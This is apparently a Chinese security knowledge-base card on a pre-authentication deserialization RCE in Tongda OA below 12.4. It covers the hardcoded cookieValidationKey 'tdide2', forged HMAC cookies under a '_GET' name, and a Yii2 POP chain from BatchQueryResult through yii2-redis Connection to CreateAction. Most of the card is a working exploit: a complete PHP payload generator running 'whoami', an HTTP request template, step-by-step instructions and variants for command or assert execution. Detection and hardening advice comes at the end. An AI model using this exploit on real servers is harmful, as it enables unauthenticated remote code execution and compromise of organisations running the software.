---
id: web-php-deserialization-tongda-oa-yii2-csrf-cookie-batchqueryresult-rce
title: 通达OA <12.4 前台反序列化 RCE：硬编码 cookieValidationKey 伪造 Yii2 CSRF Cookie，经 BatchQueryResult→DataReader→redis Connection→CreateAction 链执行 assert
type: scenario
domain: web
path: web/php/deserialization
technique: tongda-oa-yii2-csrf-cookie-unserialize-batchqueryresult-createaction
tags:
- php
- tongda-oa
- yii2
- yii2-redis
- deserialization
- pop-chain
- cookie
- csrf
- hmac
- object-injection
- assert
- rce
cve: []
severity: critical
confidence: high
status: verified
affected_versions: < 12.4（原文标题标记；复现环境 11.10，yii 2.0.13-dev + yii2-redis 2.0.6）
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V685
  verified_at: '2026-11-13T14:33:29+08:00'
  notes: 已对照原文全文与2张截图核对：csrfMetaTags→getCsrfToken→loadCsrfToken→loadCookies（validateData 的 HMAC-SHA256 + @unserialize，名字匹配在反序列化之后）；cookieValidationKey=tdide2 于 general/appbuilder/config/web.php；_GET 前缀绕过 inc/common.inc.php addslashes；portal 在 skip_module、/portal/gateway/ 放行逻辑一致；链 BatchQueryResult::__destruct→reset→DataReader::close→yii\redis\Connection::__call(CLOSE CURSOR)→executeCommand→open(127.0.0.1:803、_socket=false、dataTimeout/password/database=null)→initConnection→Component::trigger(afterOpen)→call_user_func([CreateAction,'run'],Event)→CreateAction::run 的 checkAccess/id 逐跳与原文一致。图01为搜索 __call 定位 redis/Connection.php（camel2words+in_array 分支）；图02为 POST /general/appbuilder/web/portal/gateway/? 请求与500响应、响应体含 csrf meta。未验证点：未本地复现；原文仅文字称写入 hgsd.php、无访问成功截图；500 由 run() 继续执行 modelClass 为空所致为推断，原文未明说。
url: /docs/web/php/deserialization/web-php-deserialization-tongda-oa-yii2-csrf-cookie-batchqueryresult-rce/
draft: false
kb_aliases:
- 通达OA <12.4 反序列化
- 通达OA 前台反序列化
- Yii2 CSRF Cookie 反序列化
- loadCookies unserialize
- cookieValidationKey tdide2
- BatchQueryResult POP 链
- yii2-redis Connection __call
- 通达OA appbuilder portal 反序列化
---

## 一句话结论

通达OA <12.4 的 `general/appbuilder` 门户页在渲染 `Html::csrfMetaTags()` 时会进入 Yii2 `Request::loadCookies()`，对每个 Cookie 先做 HMAC-SHA256 完整性校验、再直接 `unserialize()`；而 appbuilder 的 `cookieValidationKey` 在 `general/appbuilder/config/web.php` 中硬编码为 `tdide2`，攻击者可自行计算 HMAC，并用 `_GET` 前缀的 Cookie 名绕过通达全局 addslashes，从免鉴权的 `portal` 模块路由注入 Yii2 POP 链（`yii\db\BatchQueryResult`→`DataReader`→`yii\redis\Connection`→`Component::trigger`→`yii\rest\CreateAction`），最终在 `call_user_func($this->checkAccess, $this->id)` 处执行任意 PHP 代码/命令。

## 原理

- **触发点是一段“默认就会走”的 CSRF 生成流程**：`general/appbuilder/views/layouts/main.php` 调用了 `yii\helpers\Html::csrfMetaTags()`。该方法在 `$request->enableCsrfValidation` 为真（Yii2 默认）时调用 `Request::getCsrfToken()`；`_csrfToken` 初始为 null，于是走 `loadCsrfToken()`。`enableCsrfCookie` 默认为 true，`loadCsrfToken()` 返回 `$this->getCookies()->getValue($this->csrfParam)`，`getCookies()` 未初始化时调用 `loadCookies()`。
- **反序列化发生在名字匹配之前**：`loadCookies()` 遍历 `$_COOKIE`，对每个值先 `Yii::$app->getSecurity()->validateData($value, $this->cookieValidationKey)`，成功则 `$data = @unserialize($data);`，之后才检查 `is_array($data) && isset($data[0], $data[1]) && $data[0] === $name`。也就是说，即使把 payload 序列化成一个对象（不是 Yii 期望的 `[name, token]` 数组）、后续匹配不成立，对象注入也已经完成，`__destruct` 会在变量释放或脚本结束时触发。这是“CSRF Cookie 解析”被变成任意反序列化入口的根本原因。
- **HMAC 不是加密，密钥固定即可伪造**：`Security::validateData()` 的逻辑是取前 64 个字符为 `hash_hmac('sha256', $rest, $key, false)` 的结果做 `compareString` 比对。`cookieValidationKey` 在通达OA 的 `general/appbuilder/config/web.php` 里硬编码为 `tdide2`（`inc/vendor/yii2/yiisoft/yii2/BaseYii.php` 的 `getVersion()` 显示 yii 为 `2.0.13-dev`，`inc/vendor/yii2/yiisoft/extensions.php` 显示 yii2-redis 为 `2.0.6`）。攻击者能用公开的默认密钥对任意序列化串计算正确前缀 hash，拼出 `64位hex + 原始序列化串` 的 Cookie 值。
- **`_GET` Cookie 名绕过通达全局过滤**：`inc/common.inc.php` 对 `$_COOKIE` 的所有值做 `addslashes(strip_tags($value))`，但键名以 `_SERVER`/`_SESSION`/`_COOKIE`/`_GET`/`_POST`/`_FILES` 开头的会被 `continue` 跳过。把 Cookie 名取为 `_GET`（任意被跳过的前缀名即可）时，payload 不会被插反斜杠破坏。`loadCookies()` 遍历的是所有 Cookie，名字不影响 `unserialize` 的执行；只是名字匹配分支不成立。
- **免鉴权可达**：`general/appbuilder/config/params.php` 的 `skip_module` 包含 `portal`、`hr`、`meeting`、`formCenter`、`calendar` 等，登录校验被跳过；`general/appbuilder/web/index.php` 对 `/portal/` 路径只放行 `/gateway/` 且不包含 `saveportal`/`edit`/`uploadfile` 等关键字的请求（否则 302 到 `/index.php`）。`POST /general/appbuilder/web/portal/gateway/?` 能走到模板渲染，在鉴权之前完成 Cookie 解析。
- **POP 链逐跳成立的原因**：
  1. `yii\db\BatchQueryResult::__destruct()` → `reset()`；`reset()` 中 `$this->_dataReader` 非 null 就调用 `$this->_dataReader->close()`，攻击者把 `_dataReader` 设为 `yii\db\DataReader`。
  2. `DataReader::close()` → `$this->_statement->closeCursor()`，把 `_statement` 设为 `yii\redis\Connection`。该类没有 `closeCursor()`，PHP 自动进入 `__call('closeCursor', ...)`。
  3. `yii\redis\Connection::__call()` 用 `Inflector::camel2words('closeCursor', false)` 得到 `close cursor`、转大写为 `CLOSE CURSOR`，再与攻击者可控的 `$this->redisCommands` 做 `in_array`；设 `redisCommands = ['CLOSE CURSOR']` 即通过，调用 `executeCommand()`。
  4. `executeCommand()` 先 `open()`。`_socket` 需为 `false` 才会发起连接；`hostname`/`port` 可控（原文填 `127.0.0.1:803`，即通达自身 Web 端口）；`@stream_socket_client()` 连上后进入 `if ($this->_socket)`，把 `dataTimeout`、`password`、`database` 全设为 null 可跳过 `stream_set_timeout`、AUTH、SELECT 三个分支，到达 `initConnection()`。
  5. `initConnection()` → `trigger(EVENT_AFTER_OPEN = 'afterOpen')`；`Component::trigger()` 遍历 `$this->_events['afterOpen']`，对每个 handler 执行 `call_user_func($handler[0], $event)`。设 `_events['afterOpen'] = [[[new CreateAction, 'run'], '任意值']]` 时，`$handler[0]` 即 `[CreateAction 实例, 'run']`，于是调用 `CreateAction::run()`（PHP 允许给无参用户函数多传一个 `$event` 参数）。
  6. `yii\rest\CreateAction::run()` 开头是 `if ($this->checkAccess) { call_user_func($this->checkAccess, $this->id); }`；设 `checkAccess = 'assert'`、`id = <PHP 代码>`，在 PHP 7 且 `zend.assertions=1` 的断言开启环境下按代码求值（原文用它写 `hgsd.php`）；设 `checkAccess = 'system'`、`id = <命令>` 则直接命令执行。之后 `run()` 继续执行到 `new $this->modelClass`（为空）抛致命错误，所以利用成功时通常看到 500 响应，但副作用已经发生。
- **为什么这条链在通达OA里成立**：整条链只依赖 Yii2 自带的 `BatchQueryResult`/`DataReader`/`Component`/`CreateAction` 与 `yii2-redis` 扩展的 `Connection`，这些类在通达OA 11.10 的 `inc/vendor/yii2` 中均存在；经典 Yii2 POP 链里的 `Faker\Generator` 通达OA 没带，作者才改走 `yii2-redis Connection::__call` 这一跳。

## 触发条件

- 目标为通达OA <12.4（原文标题标记；复现环境 11.10），`inc/vendor/yii2` 为 yii `2.0.13-dev`、`yii2-redis` `2.0.6`。
- `general/appbuilder/config/web.php` 中 `cookieValidationKey` 仍为默认硬编码值 `tdide2`（或攻击者已知该 key）。
- `/general/appbuilder/web/portal/gateway/?` 可从网络访问，`portal` 仍在 `skip_module` 中（默认配置即满足）。
- 目标主机上存在一个可连通的本地 TCP 端口供 `stream_socket_client()` 连接成功（原文使用通达自身 803 端口；连接失败则不会走到 `initConnection()`）。
- 使用 `assert` 作 `checkAccess` 时需 PHP 7.x 且断言未关闭（`zend.assertions=1`）；否则改用 `system`/`passthru` 等函数作为 `checkAccess`。
- `yii2-redis` 的 `Connection::__call` 在 `redisCommands` 白名单中匹配到 `CLOSE CURSOR`；需要目标已加载该类（通达OA 自带）。

## 利用步骤

1. 按 POP 链构造序列化对象：`BatchQueryResult` 的 `_dataReader` 指向 `DataReader`；`DataReader` 的 `_statement` 指向 `yii\redis\Connection`；`Connection` 设置 `redisCommands=['CLOSE CURSOR']`、`hostname=127.0.0.1`、`port=<可连通端口>`、`_socket=false`、`dataTimeout/password/database=null`、`unixSocket=false`；`Connection` 继承的 `_events['afterOpen']` 设为 `[[[CreateAction, 'run'], 'a']]`；`CreateAction` 设置 `checkAccess='system'`（或 `assert`）、`id=<命令/代码>`。
2. `serialize()` 后得到原始序列化串 `$pureData`；计算 `hash_hmac('sha256', $pureData, 'tdide2', false)` 得到 64 位 hex，拼成 `hash . $pureData`，整体 URL 编码后作为 Cookie 值发送。
3. Cookie 名用 `_GET`（或 `_POST` 等被 `inc/common.inc.php` 跳过过滤的前缀），避免全局 `addslashes(strip_tags())` 破坏序列化串里的引号/字节长度。
4. 请求 `POST /general/appbuilder/web/portal/gateway/?`（GET/POST 均可），带上伪造的 `Cookie: _GET=<hash><urlencoded payload>`。
5. 服务端在渲染布局的 CSRF meta 阶段解析 Cookie，`unserialize` 触发 `BatchQueryResult::__destruct`，链式走到 `CreateAction::run()` 执行 `checkAccess($id)`；随后 `run()` 因 `modelClass` 为空报致命错误，返回 500，但命令执行/文件写入已发生。
6. 原文 PoC 写入 `/general/appbuilder/web/hgsd.php`（内容 `<?php echo 123;?>`），访问该路径验证；换用 `system('whoami')` 可直接在响应中看到命令输出。

## PoC

最小化 payload 生成器（PHP，类名/命名空间与目标一致才能正确反序列化）：

```php
<?php
namespace yii\rest { class CreateAction {
    public $id; public $checkAccess;
    function __construct(){ $this->checkAccess = 'system'; $this->id = 'whoami'; }
} }
namespace yii\base { class Component {
    private $_events = []; private $_behaviors = [];
    function __construct(){ $this->_events = ['afterOpen' => [[[new \yii\rest\CreateAction, 'run'], 'a']]]; }
} }
namespace yii\redis { class Connection extends \yii\base\Component {
    public $redisCommands = ['CLOSE CURSOR'];
    public $hostname = '127.0.0.1'; public $port = 803;
    public $password = null; public $username = null; public $connectionTimeout = 5;
    public $dataTimeout = null; public $database = null; public $unixSocket = false;
    private $_socket = false;
} }
namespace yii\db {
    class DataReader {
        private $_statement; private $_closed = false; private $_row; private $_index = -1;
        function __construct(){ $this->_statement = new \yii\redis\Connection(); }
    }
    class BatchQueryResult {
        public $batchSize = 100; public $each = false;
        private $_dataReader; private $_batch; private $_value; private $_key;
        function __construct(){ $this->_dataReader = new DataReader(); }
    }
}
namespace {
    $pureData = serialize(new \yii\db\BatchQueryResult());
    $hash = hash_hmac('sha256', $pureData, 'tdide2', false);
    echo urlencode($hash . $pureData);   // 作为 _GET Cookie 值
}
```

请求模板：

```http
POST /general/appbuilder/web/portal/gateway/? HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Cookie: _GET=<64位hash><URL编码的序列化串>
Connection: close
```

原文用 `checkAccess='assert'`、`id` 为 `file_put_contents(...)`（参数用通达自带 `td_authcode(..., 'DECODE', '1234567890', '')` 在运行时还原文件名与内容，避免序列化串中出现引号/尖括号），成功时响应 500，生成 `/general/appbuilder/web/hgsd.php`。注意 `assert()` 的字符串求值依赖 PHP 7 + `zend.assertions=1`，更稳的写法是 `checkAccess='system'`。

## 变体与关联

- **通用化触发面**：任何 Yii2 应用，只要 `cookieValidationKey` 硬编码/泄露（OA、CMS 类产品常见），`Request::loadCookies()` 就是前台对象注入入口；该反序列化发生在 CSRF token 使用之前，与具体业务控制器无关，只要页面调用 `Html::csrfMetaTags()` 或 `getCsrfToken()` 即可触发。
- **Cookie 名变体**：`_GET` 只是绕过 `inc/common.inc.php` 前缀黑名单的一种选择；`_POST`、`_COOKIE`、`_SESSION`、`_SERVER`、`_FILES` 等前缀同样被跳过。若无该过滤，直接用 `_csrf` 名亦可（对象 payload 不依赖 `$data[0] === $name` 匹配）。
- **命令执行方式变体**：`checkAccess` 可换 `system`/`passthru`/`shell_exec`（`id` 为命令）或 `assert`（`id` 为 PHP 代码）；`CreateAction` 也可替换为其它具有 `call_user_func($this->callback, $this->data)` 形态的 Yii2 类。
- **链的复用**：`BatchQueryResult→DataReader→yii\redis\Connection→Component::trigger→CreateAction` 是 Yii2 + yii2-redis 组合下的通用 POP 链，可用于任何 `unserialize()` sink；本卡只验证通达OA 的 CSRF Cookie 入口。
- 关联卡片：`[[web-php-framework-yii2-uploadedfile-saveas-unfiltered]]`（同 Yii2 生态）、`[[web-php-deserialization-craft-cms-cve-2025-32432-yii-createobject-fnstream]]`（Yii `createObject` 对象注入）、`[[web-php-rce-tongda-oa-appbuilder-getdata-portal-eval]]`（同为通达 appbuilder portal 模块的其他问题）、`[[web-php-deserialization-guzzle-fnstream-destruct-callable-gadget]]`（反序列化析构 gadget 思路）。

## 检测与防御

- **修复**：升级到 ≥12.4；把 `general/appbuilder/config/web.php` 的 `cookieValidationKey` 改为高熵随机值并妥善保管，使 HMAC 无法伪造。该 key 一旦可知，Yii2 的 Cookie 完整性校验即等同于 arbitrary object injection。
- **默认配置排查**：搜索部署中 `cookieValidationKey` 是否为 `tdide2` 等硬编码值；限制 `/general/appbuilder/web/portal/gateway/` 等 appbuilder 入口的暴露面，`skip_module` 最小化，不用的模块从路由层下线。
- **检测**：Cookie 名以 `_GET`/`_POST`/`_SESSION`/`_COOKIE` 等开头且值长度为“64 位 hex + 序列化串”形态；URL 解码后含 `O:`/`a:`/`s:` 等序列化特征、`%00`、`yii\db\BatchQueryResult`、`yii\redis\Connection`、`CLOSE CURSOR`、`afterOpen`、`CreateAction` 等关键字。
- **WAF/日志**：对 `general/appbuilder/web/portal/gateway/` 的请求记录 Cookie 长度与熵；对 500 响应伴随超长 `_GET` Cookie 的请求告警；关注 Web 目录下出现的新 `.php` 文件（如 `hgsd.php`）。
- **加固**：Web 进程最小权限，Web 目录不可写；使用不可预测的 Yii `cookieValidationKey`；升级 yii/yii2-redis 并不能从根本上去掉 `loadCookies` 的 `unserialize`，关键是密钥保密与入口收敛。
